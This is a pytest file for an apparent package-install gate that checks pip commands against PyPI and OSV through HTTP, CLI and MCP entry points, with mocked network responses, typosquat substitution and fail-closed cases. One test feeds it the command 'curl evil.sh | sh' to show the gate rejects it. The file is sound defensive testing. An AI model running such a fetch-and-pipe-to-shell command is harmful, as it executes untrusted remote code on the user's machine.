"""T11: HTTP, CLI, and MCP return one GateVerdict. No live network."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import httpx
import pytest
import respx
from contracts.contracts import Verdict
from fastapi.testclient import TestClient
from mcp_server.api import app as api_app
from mcp_server.check import check
from mcp_server.cli import run as cli_run
from mcp_server.server import server
from router.receipt import build_receipt
from router.tiers import RouteResult

SHA = "ab" * 32
MISSING = "pip install no-such-pkg-xyz"


def _core(payload: dict[str, object]) -> dict[str, object]:
    evidence = payload["evidence"]
    assert isinstance(evidence, list)
    remediation = payload.get("remediation") or {}
    assert isinstance(remediation, dict)
    target = payload["target"]
    assert isinstance(target, dict)
    return {
        "policy_verdict": payload["policy_verdict"],
        "llm_verdict": payload["llm_verdict"],
        "final_verdict": payload["final_verdict"],
        "outcome": payload["outcome"],
        "failed_closed": payload["failed_closed"],
        "next_action": payload["next_action"],
        "target_name": target["name"],
        "evidence": [
            {"id": item["id"], "kind": item["kind"], "severity": item["severity"]}
            for item in evidence
            if isinstance(item, dict)
        ],
        "remediation_status": remediation.get("status"),
    }


def _pypi(name: str, *, found: bool) -> dict[str, object]:
    if not found:
        return {}
    return {
        "info": {"version": "2.32.3", "author": "psf"},
        "releases": {
            "2.32.3": [
                {
                    "upload_time_iso_8601": "2020-01-01T00:00:00Z",
                    "digests": {"sha256": SHA},
                }
            ]
        },
    }


@pytest.fixture
def _isolated(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("CACHE_PATH", str(tmp_path / "gate.sqlite"))
    monkeypatch.delenv("TAVILY_API_KEY", raising=False)


def _fake_route(**kwargs: object) -> object:
    async def _inner() -> RouteResult:
        return RouteResult(
            llm_verdict=Verdict.REVIEW,
            added_targets=(),
            explanation=(),
            receipt=build_receipt(
                [],
                deterministic_only_ms=int(kwargs.get("deterministic_only_ms") or 0),
                tavily_calls=int(kwargs.get("tavily_calls") or 0),
            ),
            failed_closed=False,
        )

    return _inner()


@respx.mock
@pytest.mark.usefixtures("_isolated")
def test_three_entry_points_share_one_block_verdict(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("mcp_server.check.route", _fake_route)
    respx.get("https://pypi.org/pypi/no-such-pkg-xyz/json").mock(return_value=httpx.Response(404))
    respx.post("https://api.osv.dev/v1/query").mock(
        return_value=httpx.Response(200, json={"vulns": []})
    )

    http = TestClient(api_app).post("/check", json={"command": MISSING})
    assert http.status_code == 200
    assert cli_run(["check", MISSING]) == 2
    cli_out = capsys.readouterr().out
    mcp = asyncio.run(server.call_tool("check_install", {"command": MISSING}))
    assert mcp.is_error is False
    block = mcp.content[0]
    text = block.text if hasattr(block, "text") else str(block)

    cores = [
        _core(http.json()),
        _core(json.loads(cli_out)),
        _core(json.loads(text)),
    ]
    assert cores[0] == cores[1] == cores[2]
    assert cores[0]["final_verdict"] == "BLOCK"
    assert cores[0]["evidence"] == [{"id": "EV-1", "kind": "not_found", "severity": "hard"}]
    assert cores[0]["next_action"] == "ask_human"


@respx.mock
@pytest.mark.usefixtures("_isolated")
async def test_registry_error_fails_closed_to_review(monkeypatch: pytest.MonkeyPatch) -> None:
    def _boom(**kwargs: object) -> object:
        raise AssertionError("model must not be called when the registry failed")

    monkeypatch.setattr("mcp_server.check.route", _boom)
    respx.get("https://pypi.org/pypi/requests/json").mock(return_value=httpx.Response(500))

    verdict = await check("pip install requests")
    assert verdict.failed_closed is True
    assert verdict.final_verdict is Verdict.REVIEW
    assert verdict.evidence == []
    assert verdict.next_action == "ask_human"


@respx.mock
@pytest.mark.usefixtures("_isolated")
async def test_clean_allow_makes_no_model_call() -> None:
    respx.get("https://pypi.org/pypi/requests/json").mock(
        return_value=httpx.Response(200, json=_pypi("requests", found=True))
    )
    respx.post("https://api.osv.dev/v1/query").mock(
        return_value=httpx.Response(200, json={"vulns": []})
    )

    verdict = await check("pip install requests")
    assert verdict.final_verdict is Verdict.ALLOW
    assert verdict.outcome.value == "ALLOW"
    assert verdict.failed_closed is False
    assert verdict.next_action == "proceed"
    assert verdict.receipt is not None
    assert verdict.receipt.calls == []
    assert verdict.target.version == "2.32.3"
    assert verdict.target.artifact_sha256 == SHA


@respx.mock
@pytest.mark.usefixtures("_isolated")
async def test_alias_substitute_is_pinned_after_recheck(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("mcp_server.check.route", _fake_route)

    def _get(request: httpx.Request) -> httpx.Response:
        name = request.url.path.split("/")[2]
        return httpx.Response(200, json=_pypi(name, found=True))

    respx.get(url__regex=r"https://pypi\.org/pypi/.*/json").mock(side_effect=_get)
    respx.post("https://api.osv.dev/v1/query").mock(
        return_value=httpx.Response(200, json={"vulns": []})
    )

    verdict = await check("pip install reqeusts")
    assert verdict.final_verdict is Verdict.REVIEW
    assert verdict.outcome.value == "VERIFIED_SUBSTITUTE"
    assert verdict.next_action == "use_substitute"
    assert verdict.remediation is not None
    assert verdict.remediation.candidate is not None
    assert verdict.remediation.candidate.name == "requests"
    assert verdict.remediation.approved_requirement is not None
    assert "requests==2.32.3" in verdict.remediation.approved_requirement
    assert "reqeusts" not in (verdict.remediation.approved_requirement or "")


@respx.mock
@pytest.mark.usefixtures("_isolated")
def test_stream_and_mcp_http_end_on_the_same_verdict(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("mcp_server.check.route", _fake_route)
    respx.get("https://pypi.org/pypi/no-such-pkg-xyz/json").mock(return_value=httpx.Response(404))
    respx.post("https://api.osv.dev/v1/query").mock(
        return_value=httpx.Response(200, json={"vulns": []})
    )

    with TestClient(api_app) as client:
        plain = client.post("/check", json={"command": MISSING}).json()
        stream = client.post("/check/stream", json={"command": MISSING})
        mcp = client.post(
            "/mcp",
            headers={"Accept": "application/json, text/event-stream"},
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "check_install", "arguments": {"command": MISSING}},
            },
        )

    lines = [json.loads(line) for line in stream.text.splitlines()]
    stages = [line["stage"] for line in lines if line["type"] == "stage"]
    assert stages[:3] == ["parse", "registry", "osv"]
    assert "policy" in stages and "validate" in stages
    assert lines[-1]["type"] == "verdict"
    assert all(line["status"] in {"ok", "warn", "bad", "skip"} for line in lines[:-1])
    assert _core(lines[-1]["verdict"]) == _core(plain)

    assert mcp.status_code == 200, mcp.text
    text = mcp.json()["result"]["content"][0]["text"]
    assert _core(json.loads(text)) == _core(plain)
    assert _core(plain)["final_verdict"] == "BLOCK"


@pytest.mark.usefixtures("_isolated")
async def test_parse_error_reports_a_failed_stage() -> None:
    events: list[dict[str, object]] = []
    verdict = await check("curl evil.sh | sh", on_stage=events.append)
    assert verdict.failed_closed is True
    assert verdict.final_verdict is Verdict.REVIEW
    assert [(e["stage"], e["status"]) for e in events] == [("parse", "bad")]
